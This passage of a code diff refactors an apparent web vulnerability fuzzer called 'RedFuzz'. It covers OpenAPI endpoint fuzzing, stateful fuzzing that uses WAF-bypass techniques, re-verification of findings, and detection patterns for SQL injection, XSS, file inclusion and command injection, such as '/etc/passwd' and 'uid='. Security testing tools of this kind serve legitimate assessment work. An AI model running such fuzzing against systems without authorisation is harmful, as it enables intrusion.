             status_color = "🟢" if result['status_code'] == 200 else "🟡"
             self.log(f"{status_color} {result['method']} {result['endpoint']} - {result['status_code']} ({result['response_size']} bytes)")
-        
-        # Save results to file
         self.save_results(results)
     
     def display_directory_results(self, results):
@@ -1702,14 +1472,10 @@ class RedFuzz:
             self.log("No directories/files found.")
             return
         
-        self.log(f"\n=== Enhanced Directory Scan Results ===")
-        self.log(f"Found {len(results)} items")
-        
+        self.log(f"\n=== Enhanced Directory Scan Results ===\nFound {len(results)} items")
         for result in results:
             status_color = "🟢" if result['status_code'] == 200 else "🟡"
             self.log(f"{status_color} {result['status_code']} - {result['url']} ({result['size']} bytes)")
-        
-        # Save results to file
         self.save_results(results)
     
     def save_results(self, results, filename=None):
@@ -1718,42 +1484,22 @@ class RedFuzz:
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = f"redfuzz_results_{timestamp}.json"
         
-        # Use fast JSON library if available with enhanced error handling
-        if JSON_FAST:
-            try:
-                start_time = time.time()
-                
-                if JSON_LIBRARY == "orjson":
-                    # orjson has different API
-                    import orjson
-                    with open(filename, 'wb') as f:  # orjson writes bytes
-                        f.write(orjson.dumps(results, option=orjson.OPT_INDENT_2))
-                else:
-                    # ujson or standard json
-                    with open(filename, 'w', encoding='utf-8') as f:
-                        json.dump(results, f, ensure_ascii=False, indent=2)
-                
-                end_time = time.time()
-                save_time = end_time - start_time
-                
-                self.log(f"Results saved to {filename} (using {JSON_LIBRARY} in {save_time:.3f}s)")
-                
-            except Exception as e:
-                # Fallback to standard json with detailed error logging
-                self.log(f"Error with {JSON_LIBRARY}: {str(e)}, falling back to standard JSON")
-                import json as std_json
+        # Use fast JSON library if available
+        try:
+            if JSON_FAST and JSON_LIBRARY == "orjson":
+                import orjson
+                with open(filename, 'wb') as f:
+                    f.write(orjson.dumps(results, option=orjson.OPT_INDENT_2))
+            else: # ujson or standard json
                 with open(filename, 'w', encoding='utf-8') as f:
-                    std_json.dump(results, f, ensure_ascii=False, indent=2)
-                self.log(f"Results saved to {filename} (fallback to standard JSON)")
-        else:
-            # Use standard json
-            start_time = time.time()
+                    json.dump(results, f, ensure_ascii=False, indent=2)
+            self.log(f"Results saved to {filename} (using {JSON_LIBRARY})")
+        except Exception as e:
+            self.log(f"Error saving results with {JSON_LIBRARY}: {e}. Falling back to standard JSON.")
+            import json as std_json
             with open(filename, 'w', encoding='utf-8') as f:
-                json.dump(results, f, ensure_ascii=False, indent=2)
-            end_time = time.time()
-            save_time = end_time - start_time
-            
-            self.log(f"Results saved to {filename} (standard JSON in {save_time:.3f}s)")
+                std_json.dump(results, f, ensure_ascii=False, indent=2)
+            self.log(f"Results saved to {filename} (fallback to standard JSON)")
         
         return filename
 
@@ -1762,7 +1508,7 @@ class RedFuzz:
         try:
             from redfuzz_tui import RedFuzzTUI
             self.tui_instance = RedFuzzTUI()
-            self.tui_instance.setup_layout()
+            # self.tui_instance.setup_layout() # setup_layout is called in tui.start()
             self.log("TUI initialized successfully")
         except ImportError as e:
             self.log(f"Failed to import TUI module: {e}")
@@ -1787,10 +1533,7 @@ class RedFuzz:
         
         try:
             with open(spec_file, 'r') as f:
-                if spec_file.endswith('.yaml') or spec_file.endswith('.yml'):
-                    spec_data = pyyaml.safe_load(f)
-                else:
-                    spec_data = json.load(f)
+                spec_data = pyyaml.safe_load(f) if spec_file.endswith(('.yaml', '.yml')) else json.load(f)
             
             self.openapi_spec = OpenAPISpec(
                 endpoints=spec_data.get('paths', {}),
@@ -1799,13 +1542,12 @@ class RedFuzz:
                 info=spec_data.get('info', {})
             )
             
-            # Extract endpoints for fuzzing
+            # Extract endpoints
             for path, methods in spec_data.get('paths', {}).items():
                 for method, details in methods.items():
                     if method.upper() in ['GET', 'POST', 'PUT', 'DELETE']:
                         self.api_endpoints.append({
-                            'path': path,
-                            'method': method.upper(),
+                            'path': path, 'method': method.upper(),
                             'parameters': details.get('parameters', []),
                             'requestBody': details.get('requestBody', {}),
                             'responses': details.get('responses', {})
@@ -1823,14 +1565,9 @@ class RedFuzz:
         if session_id is None:
             session_id = hashlib.md5(f"{time.time()}".encode()).hexdigest()[:8]
         
-        session_state = SessionState(
-            session_id=session_id,
-            cookies={},
-            headers={},
-            current_url=self.target_url
+        self.session_states[session_id] = SessionState(
+            session_id=session_id, cookies={}, headers={}, current_url=self.target_url
         )
-        
-        self.session_states[session_id] = session_state
         self.current_session_id = session_id
         return session_id
 
@@ -1846,83 +1583,58 @@ class RedFuzz:
 
     def update_session_state(self, response: requests.Response, session_id: str = None):
         """Update session state with response data"""
-        if session_id is None:
-            session_id = self.current_session_id
-        
+        session_id = session_id or self.current_session_id
         if session_id and session_id in self.session_states:
             session_state = self.session_states[session_id]
             session_state.cookies.update(self.session.cookies.get_dict())
             session_state.current_url = response.url
-            
-            # Check if login is required
             if 'login' in response.url.lower() or 'auth' in response.url.lower():
                 session_state.login_required = True
 
     def verify_vulnerability(self, vulnerability) -> bool:
         """Re-test a vulnerability to confirm it's not a false positive"""
         try:
-            # Handle both dict and Vulnerability object
             if isinstance(vulnerability, dict):
-                # Convert dict to Vulnerability object
-                evidence = VulnerabilityEvidence(
-                    request_url=vulnerability.get('url', ''),
-                    request_method=vulnerability.get('method', 'GET'),
-                    request_headers={},
-                    request_body=None,
-                    response_status=vulnerability.get('status_code', 0),
-                    response_headers={},
-                    response_body='',
-                    payload_used=vulnerability.get('payload', ''),
-                    detection_time=datetime.now(),
-                    response_time=vulnerability.get('response_time', 0)
-                )
+                evidence_data = {
+                    'request_url': vulnerability.get('url', ''),
+                    'request_method': vulnerability.get('method', 'GET'),
+                    'request_headers': {}, 'request_body': None,
+                    'response_status': vulnerability.get('status_code', 0),
+                    'response_headers': {}, 'response_body': '',
+                    'payload_used': vulnerability.get('payload', ''),
+                    'detection_time': datetime.now(),
+                    'response_time': vulnerability.get('response_time', 0)
+                }
+                evidence = VulnerabilityEvidence(**evidence_data)
                 
                 vuln_obj = Vulnerability(
                     vuln_type=vulnerability.get('vulnerability_type', 'Unknown'),
                     parameter=vulnerability.get('parameter', ''),
                     payload=vulnerability.get('payload', ''),
-                    evidence=evidence,
-                    severity='Medium',
+                    evidence=evidence, severity='Medium',
                     confidence=vulnerability.get('confidence', 0.5)
                 )
             else:
-                # It's already a Vulnerability object
                 vuln_obj = vulnerability
             
-            # Wait before re-testing
             time.sleep(self.verification_delay)
             
-            # Re-create the request that caused the vulnerability
             evidence = vuln_obj.evidence
+            response = self.session.request(
+                evidence.request_method,
+                evidence.request_url,
+                headers=evidence.request_headers,
+                data=evidence.request_body,
+                timeout=self.timeout,
+                verify=False
+            )
             
-            if evidence.request_method.upper() == 'GET':
-                response = self.session.get(
-                    evidence.request_url,
-                    headers=evidence.request_headers,
-                    timeout=self.timeout,
-                    verify=False
-                )
-            else:
-                response = self.session.post(
-                    evidence.request_url,
-                    headers=evidence.request_headers,
-                    data=evidence.request_body,
-                    timeout=self.timeout,
-                    verify=False
-                )
-            
-            # Check if the vulnerability still exists
             if self.detect_vulnerability_in_response(response, vuln_obj.vuln_type, evidence.payload_used):
                 vuln_obj.verified = True
-                vuln_obj.false_positive = False
-                if not hasattr(self, 'verified_vulnerabilities'):
-                    self.verified_vulnerabilities = []
                 self.verified_vulnerabilities.append(vuln_obj)
                 return True
             else:
                 vuln_obj.false_positive = True
-                if not hasattr(self, 'false_positives'):
-                    self.false_positives = []
                 self.false_positives.append(vuln_obj)
                 return False
                 
@@ -1934,163 +1646,69 @@ class RedFuzz:
                         payload: str, response: requests.Response, response_time: float) -> VulnerabilityEvidence:
         """Collect detailed evidence for a vulnerability"""
         return VulnerabilityEvidence(
-            request_url=url,
-            request_method=method,
-            request_headers=headers,
-            request_body=body,
-            response_status=response.status_code,
-            response_headers=dict(response.headers),
-            response_body=response.text,
-            payload_used=payload,
-            detection_time=datetime.now(),
-            response_time=response_time
+            request_url=url, request_method=method, request_headers=headers,
+            request_body=body, response_status=response.status_code,
+            response_headers=dict(response.headers), response_body=response.text,
+            payload_used=payload, detection_time=datetime.now(), response_time=response_time
         )
 
     def detect_vulnerability_in_response(self, response: requests.Response, vuln_type: str, payload: str) -> bool:
         """Enhanced vulnerability detection with better accuracy and status code checking"""
-        
-        # CRITICAL FIX: Check status code first - 403, 404, 500+ are usually not vulnerabilities
-        status_code = response.status_code
-        if status_code in [403, 404, 500, 501, 502, 503, 504, 505]:
-            return False  # These status codes usually indicate no vulnerability
+        if response.status_code in [403, 404, 500, 501, 502, 503, 504, 505]:
+            return False
         
         response_text = response.text.lower()
-        
-        # Enhanced detection patterns
         detection_patterns = {
-            'sqli': [
-                'sql syntax', 'mysql error', 'oracle error', 'postgresql error',
-                'sqlite error', 'microsoft ole db provider', 'unclosed quotation mark',
-                'quoted string not properly terminated', 'sql command not properly ended'
-            ],
-            'xss': [
-                '<script>alert', 'javascript:alert', 'onerror=', 'onload=',
-                'onmouseover=', 'onfocus=', 'onblur=', 'onchange='
-            ],
-            'lfi': [
-                'root:x:', '/etc/passwd', 'windows/system32', 'c:\\windows',
-                'include_path', 'failed to open stream', 'no such file or directory'
-            ],
-            'rfi': [
-                'include_path', 'failed to open stream', 'allow_url_include',
-                'remote file inclusion', 'include()', 'require()'
-            ],
-            'command_injection': [
-                'uid=', 'gid=', 'groups=', 'root:x:', 'command not found',
-                'permission denied', 'access denied', 'cannot execute'
-            ],
-            'open_redirect': [
-                'location:', 'redirecting to', 'moved permanently', 'found'
-            ],
-            'ssrf': [
-                'internal server error', 'connection refused', 'timeout',
-                'no route to host', 'network is unreachable'
-            ]
+            'sqli': ['sql syntax', 'mysql error', 'unclosed quotation mark'],
+            'xss': ['<script>alert', 'javascript:alert', 'onerror='],
+            'lfi': ['root:x:', '/etc/passwd', 'failed to open stream'],
+            'rfi': ['failed to open stream', 'allow_url_include'],
+            'command_injection': ['uid=', 'gid=', 'command not found'],
         }
         
-        # Check for specific vulnerability patterns
         if vuln_type in detection_patterns:
-            for pattern in detection_patterns[vuln_type]:
-                if pattern in response_text:
-                    return True
+            if any(p in response_text for p in detection_patterns[vuln_type]):
+                return True
         
-        # Additional checks for specific vulnerability types
         if vuln_type == 'xss' and payload.lower() in response_text:
             return True
-        
-        # For SQL injection, only consider it vulnerable if we get a 200 status and specific error patterns
-        if vuln_type == 'sqli':
-            if status_code == 200:
-                # Look for specific SQL error patterns, not just generic "error"
-                sql_errors = ['sql syntax', 'mysql error', 'oracle error', 'postgresql error', 
-                             'sqlite error', 'unclosed quotation mark', 'quoted string not properly terminated']
-                if any(error in response_text for error in sql_errors):
-                    return True
         
         return False
 
     def generate_api_payloads(self, parameter_info: Dict) -> List[str]:
         """Generate payloads based on OpenAPI parameter information"""
-        payloads = []
         param_type = parameter_info.get('type', 'string')
-        param_format = parameter_info.get('format', '')
-        
-        # Generate payloads based on parameter type and format
         if param_type == 'string':
-            if param_format in ['email', 'uri', 'url']:
-                payloads.extend(self.payload_categories.get('open_redirect', []))
-            elif param_format == 'date':
-                payloads.extend(['2023-01-01', '2023/01/01', '01/01/2023'])
-            else:
-                payloads.extend(self.payload_categories.get('xss', []))
-                payloads.extend(self.payload_categories.get('sqli', []))
-        
+            return self.payload_categories.get('xss', []) + self.payload_categories.get('sqli', [])
         elif param_type == 'integer':
-            payloads.extend(['0', '1', '-1', '999999999', 'null', "'1'", '"1"'])
-        
-        elif param_type == 'boolean':
-            payloads.extend(['true', 'false', 'null', '1', '0', "'true'", '"false"'])
-        
-        return payloads
+            return ['0', '1', '-1', '999999999', 'null']
+        return []
 
     def fuzz_api_endpoint(self, endpoint: Dict) -> List[Vulnerability]:
         """Fuzz a specific API endpoint"""
         vulnerabilities = []
-        path = endpoint['path']
-        method = endpoint['method']
-        parameters = endpoint.get('parameters', [])
-        
-        # Build the full URL
+        path, method = endpoint['path'], endpoint['method']
         base_url = self.openapi_spec.base_url if self.openapi_spec else self.target_url
-        full_url = urljoin(base_url, path)
         
-        # Fuzz path parameters
-        for param in parameters:
+        for param in endpoint.get('parameters', []):
             if param.get('in') == 'path':
                 param_name = param['name']
-                param_payloads = self.generate_api_payloads(param)
-                
-                for payload in param_payloads:
-                    # Replace path parameter
-                    fuzzed_path = path.replace(f"{{{param_name}}}", payload)
-                    fuzzed_url = urljoin(base_url, fuzzed_path)
-                    
+                for payload in self.generate_api_payloads(param):
+                    fuzzed_url = urljoin(base_url, path.replace(f"{{{param_name}}}", payload))
                     try:
                         start_time = time.time()
-                        response = self.session.request(
-                            method,
-                            fuzzed_url,
-                            timeout=self.timeout,
-                            verify=False
-                        )
+                        response = self.session.request(method, fuzzed_url, timeout=self.timeout, verify=False)
                         response_time = time.time() - start_time
                         
-                        # Check for vulnerabilities
-                        for vuln_type in ['sqli', 'xss', 'lfi', 'rfi']:
+                        for vuln_type in ['sqli', 'xss', 'lfi']:
                             if self.detect_vulnerability_in_response(response, vuln_type, payload):
-                                evidence = self.collect_evidence(
-                                    fuzzed_url, method, {}, None, payload, response, response_time
-                                )
-                                
-                                vulnerability = Vulnerability(
-                                    vuln_type=vuln_type,
-                                    parameter=param_name,
-                                    payload=payload,
-                                    evidence=evidence,
-                                    severity='High',
-                                    confidence=0.8
-                                )
-                                
-                                vulnerabilities.append(vulnerability)
-                                
-                                # Auto-verify if enabled
-                                if self.auto_verify:
-                                    self.verify_vulnerability(vulnerability)
+                                evidence = self.collect_evidence(fuzzed_url, method, {}, None, payload, response, response_time)
+                                vuln = Vulnerability(vuln_type, param_name, payload, evidence, 'High', 0.8)
+                                vulnerabilities.append(vuln)
+                                if self.auto_verify: self.verify_vulnerability(vuln)
                         
-                        # Rate limiting
                         time.sleep(self.rate_limiter.get_delay())
                         self.rate_limiter.adjust_delay(response_time)
-                        
                     except Exception as e:
                         self.log(f"Error fuzzing API endpoint {fuzzed_url}: {e}")
         
@@ -2099,130 +1717,86 @@ class RedFuzz:
     def run_stateful_fuzzing(self, login_url: str = None, login_data: Dict = None) -> List[Vulnerability]:
         """Run stateful fuzzing with session management"""
         vulnerabilities = []
-        
-        # Create initial session
         session_id = self.create_session_state()
         self.stateful_mode = True
         
-        # Login if provided
         if login_url and login_data:
             try:
                 response = self.session.post(login_url, data=login_data, timeout=self.timeout, verify=False)
                 self.update_session_state(response, session_id)
-                
-                if response.status_code == 200:
-                    self.log("Successfully logged in, continuing with authenticated session")
-                else:
-                    self.log("Login failed, continuing with unauthenticated session")
-                    
+                self.log("Login successful, proceeding with authenticated session" if response.ok else "Login failed, continuing unauthenticated")
             except Exception as e:
                 self.log(f"Error during login: {e}")
         
-        # Now fuzz with session context
         parsed_url = urlparse(self.target_url)
         params = parse_qs(parsed_url.query)
         
-        for param_name, param_values in params.items():
-            param_payloads = self.generate_context_aware_payloads(param_name)
-            
-            for payload in param_payloads:
-                # Apply WAF bypass techniques
+        for param_name in params:
+            for payload in self.generate_context_aware_payloads(param_name):
                 for technique in self.waf_bypass_techniques:
                     bypassed_payload = self.apply_waf_bypass(payload, technique)
-                    
-                    # Create fuzzed URL
-                    fuzzed_params = params.copy()
-                    fuzzed_params[param_name] = [bypassed_payload]
-                    
-                    fuzzed_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?"
-                    fuzzed_url += "&".join([f"{k}={v[0]}" for k, v in fuzzed_params.items()])
+                    fuzzed_params = {**params, param_name: [bypassed_payload]}
+                    fuzzed_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{'&'.join([f'{k}={v[0]}' for k, v in fuzzed_params.items()])}"
                     
                     try:
                         start_time = time.time()
                         response = self.session.get(fuzzed_url, timeout=self.timeout, verify=False)
                         response_time = time.time() - start_time
-                        
-                        # Update session state
                         self.update_session_state(response, session_id)
                         
-                        # Check for vulnerabilities
                         for vuln_type in ['sqli', 'xss', 'lfi', 'rfi', 'command_injection']:
                             if self.detect_vulnerability_in_response(response, vuln_type, bypassed_payload):
-                                evidence = self.collect_evidence(
-                                    fuzzed_url, 'GET', dict(self.session.headers), None, 
-                                    bypassed_payload, response, response_time
-                                )
-                                
-                                vulnerability = Vulnerability(
-                                    vuln_type=vuln_type,
-                                    parameter=param_name,
-                                    payload=bypassed_payload,
-                                    evidence=evidence,
-                                    severity='High',
-                                    confidence=0.8
-                                )
-                                
-                                vulnerabilities.append(vulnerability)
-                                
-                                # Auto-verify if enabled
-                                if self.auto_verify:
-                                    self.verify_vulnerability(vulnerability)
+                                evidence = self.collect_evidence(fuzzed_url, 'GET', dict(self.session.headers), None, bypassed_payload, response, response_time)
+                                vuln = Vulnerability(vuln_type, param_name, bypassed_payload, evidence, 'High', 0.8)
+                                vulnerabilities.append(vuln)
+                                if self.auto_verify: self.verify_vulnerability(vuln)
                         
-                        # Rate limiting
                         time.sleep(self.rate_limiter.get_delay())
                         self.rate_limiter.adjust_delay(response_time)
-                        
                     except Exception as e:
                         self.log(f"Error in stateful fuzzing: {e}")
         
         return vulnerabilities
 
-    def calculate_total_requests(self, discovered_urls, discovered_forms, payloads, method="GET", fuzz_headers=False):
-        """Calculate total expected requests for accurate progress tracking - IMPROVED"""
+    def calculate_total_requests(self, discovered_urls, discovered_forms, payloads, fuzz_headers=False):
+        """Calculate total expected requests for accurate progress tracking - REFINED"""
         total_requests = 0
         
-        # For discovered URLs
+        # For discovered URLs with GET parameters
         for url in discovered_urls:
-            parsed_url = urlparse(url)
-            params = parse_qs(parsed_url.query) if parsed_url.query else {}
-            
-            if not params:
-                # If no parameters, estimate based on common parameters - IMPROVED ESTIMATION
-                # Use fewer common parameters for more accurate estimation
-                common_params = ['id', 'page', 'file', 'search', 'q', 'name']
-                total_requests += len(payloads) * len(common_params)
-            else:
+            params = parse_qs(urlparse(url).query)
+            if params:
                 total_requests += len(payloads) * len(params)
         
-        # For discovered forms - IMPROVED
+        # For discovered forms
         for form in discovered_forms:
-            if form['inputs']:
-                # Count only input fields with names (exclude hidden fields without names)
-                named_inputs = [input_field for input_field in form['inputs'] if input_field.get('name')]
+            # Count only non-empty input names
+            named_inputs = [inp['name'] for inp in form.get('inputs', []) if inp.get('name')]
+            if named_inputs:
                 total_requests += len(payloads) * len(named_inputs)
-            else:
-                # If no inputs, estimate based on common form parameters - REDUCED ESTIMATION
-                common_form_params = ['username', 'password', 'email', 'name', 'message']
-                total_requests += len(payloads) * len(common_form_params)
         
-        # Add header fuzzing requests if enabled - IMPROVED
+        # Add header fuzzing requests if enabled
         if fuzz_headers:
-            # Use fewer headers for more realistic estimation
+            # A more realistic estimation for headers
             common_headers = ['User-Agent', 'Referer', 'X-Forwarded-For']
-            total_requests += len(payloads) * len(common_headers) * (len(discovered_urls) + len(discovered_forms))
+            # Assume headers are fuzzed for each discovered URL and form
+            total_targets = len(discovered_urls) + len(discovered_forms)
+            total_requests += len(payloads) * len(common_headers) * total_targets
+
+        # If no specific targets, estimate for the base URL
+        if total_requests == 0 and self.target_url:
+             params = parse_qs(urlparse(self.target_url).query)
+             total_requests = len(payloads) * len(params)
+             if fuzz_headers:
+                 total_requests += len(payloads) * 3 # Estimate 3 common headers
         
         return total_requests
 
     def update_fuzzing_progress(self, completed_requests, total_requests, current_url, current_payload, status="Testing..."):
-        """Update fuzzing progress in real-time"""
+        """Update fuzzing progress in real-time - DEPRECATED in favor of direct TUI calls"""
+        # This method is kept for non-TUI mode if needed, but TUI updates are now more direct.
         if self.tui and self.tui_instance:
-            # Update payload progress
-            if total_requests > 0:
-                payload_progress = (completed_requests / total_requests) * 100
-                if hasattr(self.tui_instance, 'payload_task') and self.tui_instance.progress:
-                    self.tui_instance.progress.update(self.tui_instance.payload_task, completed=int(payload_progress), total=100)
-            
-            # Update stats
+            self.tui_instance.update_payload_progress(completed_requests)
             self.tui_instance.update_stats(
                 total_requests=completed_requests,
                 current_url=current_url,
@@ -2883,38 +2457,38 @@ SECURITY NOTES:
         # Final cleanup
         fuzzer.cleanup()
 
-        # Execute plugins if enabled - CRITICAL FIX
-        if hasattr(fuzzer, 'plugin_enabled') and fuzzer.plugin_enabled:
-            fuzzer.execute_plugins_on_results(results)
-        elif hasattr(fuzzer, 'plugin_manager') and fuzzer.plugin_manager.plugins:
-            # Fallback: execute plugins if they are loaded
-            fuzzer.execute_plugins_on_results(results)
-        
-        # Generate reports if requested
-        if args.report_format in ["html", "json", "both"]:
-            try:
-                from report_generator import ReportGenerator
-                import time
-                
-                scan_duration = time.time() - getattr(fuzzer, 'start_time', time.time())
-                report_gen = ReportGenerator()
-                
-                if args.report_format in ["html", "both"]:
-                    html_file = report_gen.generate_html_report(fuzzer.vulnerabilities, fuzzer.target_url, scan_duration)
-                    print(f"HTML report generated: {html_file}")
-                
-                if args.report_format in ["json", "both"]:
-                    json_file = report_gen.generate_json_report(fuzzer.vulnerabilities, fuzzer.target_url, scan_duration)
-                    print(f"JSON report generated: {json_file}")
+        # Execute plugins and generate reports - CRITICAL FIX for proper execution order
+        if results:
+            # Execute plugins on the final results
+            if hasattr(fuzzer, 'plugin_enabled') and fuzzer.plugin_enabled:
+                fuzzer.execute_plugins_on_results(results)
+            elif hasattr(fuzzer, 'plugin_manager') and fuzzer.plugin_manager.plugins:
+                fuzzer.execute_plugins_on_results(results)
+
+            # Generate reports if requested
+            if args.report_format in ["html", "json", "both"]:
+                try:
+                    from report_generator import ReportGenerator
+                    scan_duration = time.time() - fuzzer.scan_start_time
+                    report_gen = ReportGenerator()
+                    output_dir = os.path.dirname(args.output) if args.output else 'reports'
                     
-            except ImportError:
-                print("Warning: Report generator not available. Install required dependencies.")
-            except Exception as e:
-                print(f"Error generating report: {str(e)}")
-        
-        # Save results to file if specified
-        if args.output:
-            fuzzer.save_results(args.output)
+                    if args.report_format in ["html", "both"]:
+                        html_file = report_gen.generate_html_report(results, fuzzer.target_url, scan_duration, output_dir)
+                        print(f"HTML report generated: {html_file}")
+
+                    if args.report_format in ["json", "both"]:
+                        json_file = report_gen.generate_json_report(results, fuzzer.target_url, scan_duration, output_dir)
+                        print(f"JSON report generated: {json_file}")
+
+                except ImportError:
+                    print("Warning: Report generator not available. Install required dependencies.")
+                except Exception as e:
+                    print(f"Error generating report: {e}")
+
+            # Save results to file if specified
+            if args.output and args.report_format not in ["json", "both"]:
+                fuzzer.save_results(results, filename=args.output)
     
     except requests.exceptions.ConnectionError:
         print("Error: Connection failed. Check if the target URL is accessible.")
